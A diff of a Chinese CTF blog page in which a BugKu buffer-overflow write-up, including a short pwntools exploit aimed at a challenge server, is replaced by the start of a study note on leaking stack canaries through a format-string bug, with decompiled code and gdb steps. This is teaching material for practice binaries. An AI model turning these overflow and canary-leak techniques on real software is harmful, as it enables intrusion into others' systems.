@@ -157,7 +157,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [BugKu]overflowPWN
+                                [PWN]Canary保护绕过+格式化字符串学习笔记
                             </h1>
                             
                                 <!--en-->
@@ -167,56 +167,98 @@
                                         「配枪朱丽叶 - 分部。」
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2021-06-28</a>
+                                Date: <a href="#">2021-07-13</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">0.8
+                                    href="#">3.3
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">151</a></span>
+                                    <span class="post-words">words:<a href="#">655</a></span>
                                     
-                                        <span class="post-category">
-                                Category:
-                                
-                                <a href="https://shawr00t.github.io/HdcmhNKsB/">pwn</a>
-                                
-                            </span>
-                                        
                                 </div>
                                 
                         </header>
                         
                         <div class="post-content">
-                            <p>checksec看了下，四个保护都没有开。<br>
-main中代码如下：</p>
+                            <blockquote>
+<blockquote>
+<p>Canary是一种栈保护手段，通常通过在栈中插入cookie信息（一般在ebp上方），在函数返回的时候检查cookie是否改变，如果改变则认为栈结构被破坏，则调用一个函数强制停止程序。当开启Canary保护的时候不能通过传统的栈溢出直接覆盖返回值劫持EIP。（EIP寄存器里存储的是CPU下次要执行的指令的地址）</p>
+</blockquote>
+</blockquote>
+<p>以CTFshow的pwn04为例。</p>
+<pre><code>Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+</code></pre>
+<p><code>main()</code>函数如下：</p>
 <pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  char s; // [rsp+0h] [rbp-30h]
-
-  memset(&amp;s, 0, 0x30uLL);
-  setvbuf(stdout, 0LL, 2, 0LL);
-  setvbuf(stdin, 0LL, 1, 0LL);
-  puts(&quot;say something?&quot;);
-  read(0, &amp;s, 0x100uLL);
-  puts(&quot;oh,that's so boring!&quot;);
+  init();
+  puts(&quot;Hello Hacker!&quot;);
+  vuln();
   return 0;
 }
 </code></pre>
-<p>还看到了直接获取flag的get_shell_函数，地址是0x400751：</p>
-<pre><code class="language-c">int get_shell_()
+<p><code>vuln()</code>内容如下：</p>
+<pre><code class="language-c">unsigned int vuln()
 {
-  puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;);
-  puts(&quot;this is your flag!&quot;);
-  return system(&quot;cat flag&quot;);
+  signed int i; // [esp+4h] [ebp-74h]
+  char buf; // [esp+8h] [ebp-70h]
+  unsigned int v3; // [esp+6Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  for ( i = 0; i &lt;= 1; ++i )
+  {
+    read(0, &amp;buf, 0x200u);
+    printf(&amp;buf);
+  }
+  return __readgsdword(0x14u) ^ v3;
 }
 </code></pre>
-<p>可以利用read函数溢出让返回地址为0x400751，exp如下：</p>
-<pre><code class="language-python">from pwn import *
-
-p = remote('114.67.246.176',16081)
-payload = 'a'*0x30+'a'*0x8+p64(0x400751)
-p.sendline(payload)
-p.interactive()
+<p>可以看到<code>read()</code>有明显的栈溢出漏洞。因为开启了Canary保护，无法直接利用栈溢出。但是<code>vuln()</code>这里的<code>printf()</code>函数的值来源于外部用户可控的输入，所以用户完全可以在字符串中嵌入格式化字符（如%s，即解析其地址对应的字符串），导致格式化字符串漏洞，因此可以通过利用格式化字符串漏洞来泄露出canary的值。<br>
+首先使用gdb对vuln函数进行调试：<code>disass vuln</code>：</p>
+<pre><code>Dump of assembler code for function vuln:
+   0x0804862e &lt;+0&gt;:	push   ebp
+   0x0804862f &lt;+1&gt;:	mov    ebp,esp
+   0x08048631 &lt;+3&gt;:	sub    esp,0x78
+   0x08048634 &lt;+6&gt;:	mov    eax,gs:0x14
+   0x0804863a &lt;+12&gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x0804863d &lt;+15&gt;:	xor    eax,eax
+   0x0804863f &lt;+17&gt;:	mov    DWORD PTR [ebp-0x74],0x0
+   0x08048646 &lt;+24&gt;:	jmp    0x8048671 &lt;vuln+67&gt;
+   0x08048648 &lt;+26&gt;:	sub    esp,0x4
+   0x0804864b &lt;+29&gt;:	push   0x200
+   0x08048650 &lt;+34&gt;:	lea    eax,[ebp-0x70]
+   0x08048653 &lt;+37&gt;:	push   eax
+   0x08048654 &lt;+38&gt;:	push   0x0
+   0x08048656 &lt;+40&gt;:	call   0x8048430 &lt;read@plt&gt;
+   0x0804865b &lt;+45&gt;:	add    esp,0x10
+   0x0804865e &lt;+48&gt;:	sub    esp,0xc
+   0x08048661 &lt;+51&gt;:	lea    eax,[ebp-0x70]
+   0x08048664 &lt;+54&gt;:	push   eax
+   0x08048665 &lt;+55&gt;:	call   0x8048440 &lt;printf@plt&gt;
+   0x0804866a &lt;+60&gt;:	add    esp,0x10
+   0x0804866d &lt;+63&gt;:	add    DWORD PTR [ebp-0x74],0x1
+   0x08048671 &lt;+67&gt;:	cmp    DWORD PTR [ebp-0x74],0x1
+   0x08048675 &lt;+71&gt;:	jle    0x8048648 &lt;vuln+26&gt;
+   0x08048677 &lt;+73&gt;:	nop
+   0x08048678 &lt;+74&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x0804867b &lt;+77&gt;:	xor    eax,DWORD PTR gs:0x14
+   0x08048682 &lt;+84&gt;:	je     0x8048689 &lt;vuln+91&gt;
+   0x08048684 &lt;+86&gt;:	call   0x8048450 &lt;__stack_chk_fail@plt&gt;
+   0x08048689 &lt;+91&gt;:	leave  
+   0x0804868a &lt;+92&gt;:	ret    
+End of assembler dump.
 </code></pre>
+<p>可以看到print()函数的地址（0x08048665），对这个地址下断点，然后运行程序。</p>
+<pre><code>gdb-peda$ b * 0x08048665
+gdb-peda$ run
+</code></pre>
+<p>可以看到这里有一行：</p>
+<pre><code>0x804865e &lt;vuln+48&gt;:	sub    esp,0xc
+</code></pre>
+<p>这个ebp-0xc就是canary的位置。</p>
 
                         </div>
                         
@@ -231,7 +273,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://shawr00t.github.io/bugkuoverflowpwn/">https://shawr00t.github.io/bugkuoverflowpwn/</a></span>
+                                                <span><a href="https://shawr00t.github.io/pwncanary-bao-hu-rao-guo-ge-shi-hua-zi-fu-chuan-xue-xi-bi-ji/">https://shawr00t.github.io/pwncanary-bao-hu-rao-guo-ge-shi-hua-zi-fu-chuan-xue-xi-bi-ji/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -246,9 +288,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/bugkuoverflowpwn/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/bugkuoverflowpwn/&sharesource=qzone&title=[BugKu]overflowPWN&pics=https://shawr00t.github.io/images/avatar.png?v=1626333275922&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/bugkuoverflowpwn/&sharesource=weibo&title=[BugKu]overflowPWN + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1626333275922 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/pwncanary-bao-hu-rao-guo-ge-shi-hua-zi-fu-chuan-xue-xi-bi-ji/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/pwncanary-bao-hu-rao-guo-ge-shi-hua-zi-fu-chuan-xue-xi-bi-ji/&sharesource=qzone&title=[PWN]Canary保护绕过+格式化字符串学习笔记&pics=https://shawr00t.github.io/images/avatar.png?v=1626333275922&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/pwncanary-bao-hu-rao-guo-ge-shi-hua-zi-fu-chuan-xue-xi-bi-ji/&sharesource=weibo&title=[PWN]Canary保护绕过+格式化字符串学习笔记 + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1626333275922 "><i class="fa fa-weibo "></i></a>
                                                         
                                                             <div class="reward ">
                                                                 <div class="reward-button ">&yen;
@@ -265,12 +307,6 @@ p.interactive()
                                                                         <span>Tag(s):</span>
                                                                         <span class="tag ">
                         
-                        
-                        <a href="https://shawr00t.github.io/HdcmhNKsB/">#
-                                                pwn
-                                                    </a>
-                                                    
-                                                        
                                                             </span>
                                                                     </div>
                                                                     <div>
@@ -283,15 +319,7 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/pwnablekrfd/">
-                                                                                            [pwnable.kr]fd
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/">
-                                                                                                    [攻防世界]PWN-level0
-                                                                                                </a>
-                                                                                                
                                                                                 </section>
                     </article>
                 </div>
